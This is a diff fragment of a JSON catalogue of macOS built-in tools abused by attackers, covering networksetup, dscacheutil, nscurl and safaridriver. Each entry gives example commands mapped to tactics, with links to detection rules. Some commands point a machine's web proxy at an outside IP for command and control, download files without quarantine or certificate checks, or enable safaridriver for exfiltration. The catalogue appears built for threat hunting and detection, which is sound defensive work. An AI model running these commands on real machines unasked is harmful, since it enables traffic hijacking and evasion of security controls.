+                "name": "Elastic Detection Rules: Attempt to Disable Gatekeeper",
+                "url": "https://github.com/elastic/detection-rules/blob/e9baebc2bc18f90ae16501613cd9521a16a38ad7/rules/macos/defense_evasion_attempt_to_disable_gatekeeper.toml"
+            },
+            {
+                "name": "Sigma Rules: Disable Security Tools",
+                "url": "https://github.com/SigmaHQ/sigma/blob/cd71edc09ca915f389e50df5b1bbb5ecd4b7f89d/rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Disable Gatekeeper on macOS Big Sur (11.x)",
+                "url": "https://disable-gatekeeper.github.io/"
+            }
+        ]
+    },
+    {
+        "name": "networksetup",
+        "author": "Jason Trost (@jason_trost)",
+        "short_description": "Configure network settings in System Preferences.",
+        "full_description": "networksetup extensive tool for reading and setting various network configuration details useful for Discovery and Command and Control.",
+        "created": "2023-04-22",
+        "example_use_cases": [
+            {
+                "name": "network device enumeration",
+                "description": "Use networksetup to display services with corresponding port and device in order they are tried for connecting to a network.",
+                "code": "networksetup -listnetworkserviceorder",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Detect connected network hardware",
+                "description": "Use networksetup to detect new network hardware and create a default network service on the hardware.",
+                "code": "networksetup -detectnewhardware",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "network device enumeration",
+                "description": "Use networksetup to list all network interfaces, providing name, device name, MAC address.",
+                "code": "networksetup -listallhardwareports",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "network device enumeration",
+                "description": "Use networksetup to list all network interface names.",
+                "code": "networksetup -listallnetworkservices",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "DNS server enumeration",
+                "description": "Use networksetup to get configured DNS servers for a specific interface.",
+                "code": "networksetup -getdnsservers Wi-Fi",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration",
+                    "dns"
+                ]
+            },
+            {
+                "name": "Enumerate configured web proxy URL for an interface",
+                "description": "Displays web proxy auto-configuration information for the specified interface.",
+                "code": "networksetup -getautoproxyurl \"Thunderbolt Ethernet\"",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration",
+                    "proxy"
+                ]
+            },
+            {
+                "name": "Enumerate configured web proxy for an interface",
+                "description": "Displays standard web proxy information for the specified interface.",
+                "code": "networksetup -getwebproxy \"Wi-Fi\"",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration",
+                    "proxy"
+                ]
+            },
+            {
+                "name": "Set the https web proxy for an interface",
+                "description": "Use networksetup to set the https web proxy for an interface.",
+                "code": "networksetup -setsecurewebproxy \"Wi-Fi\" 46.226.108.171",
+                "tactics": [
+                    "Command and Control"
+                ],
+                "tags": [
+                    "network",
+                    "configuration",
+                    "proxy"
+                ]
+            },
+            {
+                "name": "Set the http web proxy for an interface",
+                "description": "Use networksetup to set the http web proxy for an interface.",
+                "code": "networksetup -setwebproxy \"Wi-Fi\" 46.226.108.171",
+                "tactics": [
+                    "Command and Control"
+                ],
+                "tags": [
+                    "network",
+                    "configuration",
+                    "proxy"
+                ]
+            },
+            {
+                "name": "Set auto proxy URL for an interface",
+                "description": "Use networksetup to set the proxy URL for an interface.",
+                "code": "networksetup -setautoproxyurl \"Wi-Fi\" $autoProxyURL",
+                "tactics": [
+                    "Command and Control"
+                ],
+                "tags": [
+                    "network",
+                    "configuration",
+                    "proxy"
+                ]
+            },
+            {
+                "name": "Enable auto proxy state",
+                "description": "Use networksetup to enable the proxy auto-config",
+                "code": "networksetup -setautoproxystate \"Wi-Fi\" on",
+                "tactics": [
+                    "Command and Control"
+                ],
+                "tags": [
+                    "network",
+                    "configuration",
+                    "proxy"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/networksetup"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Threat Hunting the macOS edition Megan Carney (Report)",
+                "url": "https://megancarney.com/presentations/ExternalReport_ThreatHuntingMacOS.pdf"
+            },
+            {
+                "name": "GrrCon 2018: Threat Hunting the macOS edition Megan Carney",
+                "url": "https://www.youtube.com/watch?v=_K4gnSuDkRM&feature=youtu.be"
+            },
+            {
+                "name": "Mac Malware of 2017 - a analysis of the new mac malware of 17",
+                "url": "https://objective-see.org/blog/blog_0x25.html"
+            },
+            {
+                "name": "Ay MaMi - Analyzing a New macOS DNS Hijacker: OSX/MaMi",
+                "url": "https://objective-see.org/blog/blog_0x26.html"
+            },
+            {
+                "name": "Analyzing OSX.DazzleSpy - A fully-featured cyber-espionage macOS implant",
+                "url": "https://objective-see.org/blog/blog_0x6D.html"
+            },
+            {
+                "name": "The Mac Malware of 2018 - a analysis of the new mac malware of - 18",
+                "url": "https://objective-see.org/blog/blog_0x3C.html"
+            },
+            {
+                "name": "From The DPRK With Love - analyzing a recent north korean macOS backdoor",
+                "url": "https://objective-see.org/blog/blog_0x6E.html"
+            }
+        ]
+    },
+    {
+        "name": "dscacheutil",
+        "author": "Ethan Nay",
+        "short_description": "gather information, statistics and initiate queries to the Directory Service cache.",
+        "full_description": "dscacheutil does various operations against the Directory Service cache including gathering statistics, initiating lookups, inspection, cache flush, etc.\nThis tool replaces most of the functionality of the lookupd tool previously available in the OS.",
+        "created": "2023-08-23",
+        "example_use_cases": [
+            {
+                "name": "Lookup  a user",
+                "description": "List the user information",
+                "code": "dscacheutil -q user -a name <USER_NAME>",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Lookup all users",
+                "description": "List the all users information",
+                "code": "dscacheutil -q user",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/dscacheutil"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/dscacheutil",
+                "url": "https://macosbin.com/bin/dscacheutil"
+            },
+            {
+                "name": "dscacheutil man page",
+                "url": "https://ss64.com/osx/dscacheutil.html"
+            }
+        ]
+    },
+    {
+        "name": "nscurl",
+        "author": "Leo Pitt (@_D00mfist)",
+        "short_description": "Download, upload, and read files.",
+        "full_description": "macOS version of curl that is used to download files to a target without applying the quarantine extended attribute",
+        "created": "2023-05-22",
+        "example_use_cases": [
+            {
+                "name": "Download file",
+                "description": "Download file and ignore cert checking",
+                "code": "nscurl -k https://google.com -o /private/tmp/google",
+                "tactics": [
+                    "Defense Evasion",
+                    "Command and Control"
+                ]
+            },
+            {
+                "name": "Download file",
+                "description": "Download file to the Downloads directory using -dl",
+                "code": "nscurl https://google.com -dl",
+                "tactics": [
+                    "Defense Evasion",
+                    "Command and Control"
+                ]
+            },
+            {
+                "name": "Download file",
+                "description": "Download file to a designated directory using -dir",
+                "code": "nscurl https://google.com -dir /private/tmp/google",
+                "tactics": [
+                    "Defense Evasion",
+                    "Command and Control"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/nscurl"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect all curl and nscurl activity",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/all_curl_activity"
+            },
+            {
+                "name": "Jamf Protect: Detect file downloads using the insecure argument for curl and nscurl",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/file_download_curl_insecure"
+            },
+            {
+                "name": "Sigma: File Download Via Nscurl - MacOS",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "How to Diagnose App Transport Security Issues using nscurl and OpenSSL",
+                "url": "https://www.agnosticdev.com/content/how-diagnose-app-transport-security-issues-using-nscurl-and-openssl"
+            },
+            {
+                "name": "Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - nscurl",
+                "url": "https://danielcortez.substack.com/p/living-off-the-land-exploring-macos"
+            }
+        ]
+    },
+    {
+        "name": "safaridriver",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Enable the WebDriver Safari browser API for Selenium testing.",
+        "full_description": "safaridriver is a tool that is used to enable Selenium testing via the macOS WebDriver protocol. Once enabled, the WebDriver API could be abused by attackers to communicate with external servers for command and control or exfiltration purposes.",
+        "created": "2023-05-20",
+        "example_use_cases": [
+            {
+                "name": "Enable safaridriver",
+                "description": "The following command can be used to enable the WebDriver Safari browser API. The command must be run as root or with sudo privileges.",
+                "code": "sudo safaridriver --enable",
+                "tactics": [
+                    "Command and Control",
+                    "Exfiltration"
+                ],
+                "tags": [
+                    "safari",
+                    "selenium"
+                ]
+            }
+        ],
+        "paths": [
+            "/System/Cryptexes/App/usr/bin/safaridriver",
+            "/usr/bin/safaridriver"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "About WebDriver for Safari",
+                "url": "https://developer.apple.com/documentation/webkit/about_webdriver_for_safari"
+            },
+            {
+                "name": "You Talking To Me?",
+                "url": "https://starlabs.sg/blog/2021/04-you-talking-to-me/"
+            }
+        ],
+        "acknowledgements": [
+            "Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques"
+        ]
+    }
+]
